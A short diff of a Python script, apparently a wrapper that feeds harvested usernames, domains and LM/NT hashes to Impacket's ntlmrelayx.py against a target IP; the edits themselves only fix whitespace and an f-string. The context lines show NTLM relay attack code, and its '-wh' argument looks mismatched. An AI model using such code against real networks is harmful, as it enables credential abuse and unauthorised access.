@@ -48,10 +48,10 @@ def parse_hash_file(file_path):
     except Exception as e:
         print(f"Failed to parse hash file: {e}")
         return []
-    
+
 def ntlm_relay(target_ip, credentials):
     for username, domain, lmhash, nthash in credentials:
-        print(f"\nAttempting NTLM relay attack with:")
+        print("\nAttempting NTLM relay attack with:")
         print(f"  Username: {username}")
         print(f"  Domain: {domain}")
         print(f"  LMHash: {lmhash}")
@@ -66,12 +66,12 @@ def ntlm_relay(target_ip, credentials):
                 "-wh",
                 f"{username}:{domain}:{lmhash}:{nthash}"
             ]
-            
+
             print(f"Running command: {' '.join(command)}")
             subprocess.run(command, check=True)
-            
+
             print(f"NTLM relay attack completed successfully for {username}@{domain}!")
-            
+
         except subprocess.CalledProcessError as e:
             print(f"Failed to execute ntlmrelayx.py: {e}")
 
